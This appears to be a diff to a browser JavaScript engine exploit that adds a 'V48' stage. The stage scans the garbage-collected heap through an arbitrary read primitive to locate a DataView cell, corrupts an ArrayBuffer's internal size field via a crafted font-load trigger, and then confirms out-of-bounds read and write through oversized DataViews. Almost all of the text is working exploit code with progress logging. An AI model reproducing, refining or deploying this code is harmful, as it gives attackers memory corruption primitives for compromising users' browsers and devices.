@@ -1552,13 +1552,176 @@ try{
                     bs('V45-DTOR-MSB=0x'+newDMSB.toString(16)+'-NEW-SIZE='+hex(newSize));
 
                     if(f45&&newSize>0x100n){
-                      bs('V45-SIZE-EXPANDED='+hex(newSize));
+                      bs('V48-SIZE-EXPANDED='+hex(newSize));
+                      bs('V48-STALE-A='+hex(useAB));
 
-                      try{
+                      try{/*V48 — fresh DV to find real impl */
                         var sprayBuf=window.__v688.spray[mIdx];
-                        bs('V46-JS-BYTELEN='+sprayBuf.byteLength);
+                        bs('V48-JS-BL-PRE='+sprayBuf.byteLength);
 
-                        /* CORE DIAGNOSTIC: dump the FULL JSArrayBuffer cell.
+                        /* STEP 1: Create a FRESH DataView on sprayBuf.
+                         * The engine resolves sprayBuf → JSArrayBuffer → m_impl
+                         * for us. byteOffset=0 distinguishes from spray's original
+                         * views (byteOffset=0x20). */
+                        var freshDV;
+                        try{
+                          freshDV = new DataView(sprayBuf, 0, 0x40);
+                          bs('V48-FRESH-DV-OK-len='+freshDV.byteLength);
+                        }catch(efd){
+                          bs('V48-FRESH-DV-FAIL-'+String(efd&&efd.message?efd.message:'?'));
+                          freshDV = new DataView(sprayBuf, 0); /* no explicit length */
+                          bs('V48-FRESH-DV-NOLEN-OK-len='+freshDV.byteLength);
+                        }
+
+                        /* STEP 2: Find the fresh DV cell via CSCAN.
+                         * Search GC heap for cells with m_vector matching our data
+                         * and m_byteOffset=0 (fresh) vs 0x20 (original spray). */
+                        var dataBase = V - 0x20n;
+                        bs('V48-SCAN-FOR-FRESH-DV-near='+hex(cell));
+
+                        /* Scan near the known cell region for DataView cells.
+                         * Look in a ±0x10000 range from the certified cell. */
+                        var freshCell = 0n;
+                        var freshMBuf = 0n;
+                        var scanned = 0;
+
+                        /* The certified DV cell has structureID pattern. Read its
+                         * header to get the structureID for DataView cells. */
+                        var dvStructID = v45LE32(readAt(cell, 4), 0);
+                        var dvType = parseInt(readAt(cell+5n, 1), 16);
+                        bs('V48-DV-STRUCT=0x'+dvStructID.toString(16)+'-TYPE=0x'+dvType.toString(16));
+
+                        /* Scan: check cells at 64-byte stride (MarkedBlock cell size).
+                         * DataView cells are typically 0x40 bytes. */
+                        var scanBase = (cell & ~0xFFFFn); /* align to 64KB block */
+                        for(var sc = scanBase; sc < scanBase + 0x10000n && freshCell === 0n; sc += 0x40n){
+                          scanned++;
+                          if(sc === cell) continue; /* skip the certified cell */
+                          var hdr = readAt(sc, 0x38);
+                          var sid = v45LE32(hdr, 0);
+                          var typ = parseInt(hdr.substr(5*2, 2), 16);
+                          if(sid === dvStructID && typ === dvType){
+                            /* Found a DataView cell. Check m_byteOffset */
+                            var cOff = v45LE64(hdr, 0x20);
+                            var cLen = v45LE64(hdr, 0x18);
+                            var cVec = v45LE64(hdr, 0x10);
+                            if(cOff === 0n && cLen === 0x40n){
+                              /* byteOffset=0, length=64 → this is our fresh DV! */
+                              var cBuf = v45LE64(hdr, 0x30);
+                              bs('V48-FRESH-CELL='+hex(sc)+'-vec='+hex(cVec)+'-mbuf='+hex(cBuf));
+                              freshCell = sc;
+                              freshMBuf = cBuf;
+                            }
+                          }
+                        }
+                        bs('V48-SCANNED='+scanned);
+
+                        if(freshCell === 0n){
+                          bs('V48-FRESH-CELL-NOT-FOUND');
+                        }else{
+                          bs('V48-FRESH-MBUF='+hex(freshMBuf));
+                          bs('V48-STALE-A='+hex(useAB));
+                          bs('V48-SAME='+(freshMBuf===useAB));
+
+                          if(freshMBuf !== useAB && freshMBuf > 0x1000000n){
+                            /* H1: DRIFT CONFIRMED — fresh DV uses a different AB! */
+                            bs('V48-H1-DRIFT-CONFIRMED');
+
+                            /* Dump the REAL authority AB */
+                            var realDump2 = readAt(freshMBuf, 0x60);
+                            bs('V48-REAL-IMPL-DUMP='+realDump2);
+                            var ri_mData = v45LE64(realDump2, 0x10);
+                            var ri_mSize = v45LE64(realDump2, 0x30);
+                            bs('V48-REAL-mData='+hex(ri_mData)+'-mSize='+hex(ri_mSize));
+                            bs('V48-DATA-MATCH='+(ri_mData === dataBase));
+
+                            /* Gate check on the REAL impl */
+                            var ri_gate = parseInt(realDump2.substr(0x37*2, 2), 16);
+                            var ri_vecSz = v45LE32(realDump2, 0x4B);
+                            bs('V48-GATE=0x'+ri_gate.toString(16)+'-VECSZ=0x'+ri_vecSz.toString(16));
+
+                            if(ri_gate === 0 && ri_vecSz === 0 && ri_mSize <= 0x100n){
+                              /* Fire the AB+0x17 shot at the REAL impl! */
+                              bs('V48-FIRE-AT-REAL-IMPL='+hex(freshMBuf));
+
+                              for(var rb2=0;rb2<8;rb2++)hitBuf[0x58+rb2]=Number((L1>>BigInt(rb2*8))&0xFFn);
+                              var t48 = readAt(sibBk+0x88n, 0x38);
+                              for(var pz2=0xC0;pz2<0x100;pz2++)sv.setUint8(pz2,0);
+                              dvSetBig(sv, 0x88, freshMBuf+0x17n);
+                              for(var sz2=0x28;sz2<=0x57;sz2++)hitBuf[sz2]=0;
+                              for(var c22=0x60;c22<=0x67;c22++)hitBuf[c22]=0;
+                              hitBuf[0x82]=0;hitBuf[0x83]=1;hitBuf[0x87]=1;
+                              for(var bl2=0x84;bl2<=0x89;bl2++)hitBuf[bl2]=1;
+                              for(var tb2=0;tb2<0x38;tb2++)hitBuf[0x88+tb2]=parseInt(t48.substr(tb2*2,2),16);
+                              for(var hz2=0x98;hz2<0xB0;hz2++)hitBuf[hz2]=0;
+                              for(var hb2=0;hb2<8;hb2++)hitBuf[0x58+hb2]=Number(((S+0x30n)>>BigInt(hb2*8))&0xFFn);
+
+                              var f48=false;
+                              try{faces[zi].load();f48=true;bs('V48-REAL-FIRE-RETURNED');}
+                              catch(ef2){bs('V48-REAL-FIRE-THREW-'+String(ef2&&ef2.message?ef2.message:'?'));}
+
+                              for(var rc2=0;rc2<8;rc2++)hitBuf[0x58+rc2]=Number((L1>>BigInt(rc2*8))&0xFFn);
+
+                              /* Verify */
+                              var newRealSize = v45LE64(readAt(freshMBuf+0x30n, 8), 0);
+                              bs('V48-REAL-NEW-SIZE='+hex(newRealSize));
+                              bs('V48-JS-BL-POST='+sprayBuf.byteLength);
+
+                              if(f48 && newRealSize > 0x100n){
+                                bs('V48-REAL-EXPANDED='+hex(newRealSize));
+
+                                /* THE CONSTRUCTION LADDER */
+                                var ladder=[0x101, 0x1000, 0x10000, 0x100000, 0x4000000];
+                                for(var li=0;li<ladder.length;li++){
+                                  try{
+                                    var oobDV = new DataView(sprayBuf, 0, ladder[li]);
+                                    bs('V48-LADDER-OK-0x'+ladder[li].toString(16)+'-len='+oobDV.byteLength);
+
+                                    /* OOB read: next spray buffer at +0x100 */
+                                    if(ladder[li] > 0x100){
+                                      var oobQ = oobDV.getBigUint64(0x100, true);
+                                      bs('V48-OOB-Q-0x100='+hex(oobQ));
+
+                                      /* OOB write test */
+                                      var origB = oobDV.getUint8(0x100);
+                                      oobDV.setUint8(0x100, 0x42);
+                                      var wroteB = oobDV.getUint8(0x100);
+                                      oobDV.setUint8(0x100, origB);
+                                      bs('V48-OOB-WRITE=0x'+wroteB.toString(16));
+
+                                      if(wroteB === 0x42){
+                                        bs('V48-OOB-RW-CONFIRMED-size=0x'+ladder[li].toString(16));
+                                        verd('ok','V48 OOB R/W at 0x'+ladder[li].toString(16));
+                                      }
+                                    }
+                                    break;
+                                  }catch(elad){
+                                    bs('V48-LADDER-FAIL-0x'+ladder[li].toString(16)+'-'+String(elad&&elad.message?elad.message:'?'));
+                                  }
+                                }
+                              }
+                            }else{
+                              bs('V48-GATE-FAIL-on-real-impl');
+                            }
+                          }else{
+                            /* H2: Same object — binary divergence */
+                            bs('V48-H2-SAME-OBJECT-binary-divergence');
+                            bs('V48-TRYING-LADDER-ANYWAY');
+                            /* Try the ladder even with the "stale" expansion */
+                            var ladder2=[0x101, 0x200, 0x100];
+                            for(var li2=0;li2<ladder2.length;li2++){
+                              try{
+                                var dv2 = new DataView(sprayBuf, 0, ladder2[li2]);
+                                bs('V48-H2-LADDER-OK-0x'+ladder2[li2].toString(16));
+                                break;
+                              }catch(el2){
+                                bs('V48-H2-LADDER-FAIL-0x'+ladder2[li2].toString(16));
+                              }
+                            }
+                          }
+                        }
+                        if(false){ /* OLD V46/V47 diagnostics — dead code */
+                        void(0); /* CORE DIAGNOSTIC: dump the FULL JSArrayBuffer cell.
                          * jsABCell was found at V45 step. Read 0x80 bytes. */
                         if(typeof jsABCell !== 'undefined' && jsABCell > 0n){
                           bs('V46-JSAB-CELL='+hex(jsABCell));
@@ -1817,8 +1980,9 @@ try{
                             bs('V47-DV-BUF-BL='+dvBuf.byteLength);
                           }
                         }catch(edb){bs('V47-DV-BUF-ERR');}
+                        } /* end if(false) dead V46/V47 code */
 
-                      }catch(edv){bs('V47-ERR-'+String(edv&&edv.message?edv.message:'?'));}
+                      }catch(edv){bs('V48-ERR-'+String(edv&&edv.message?edv.message:'?'));}
                     }else if(f45){
                       bs('V45-SIZE-NOT-EXPANDED='+hex(newSize));
                     }else{bs('V45-FIRE-FAIL');}
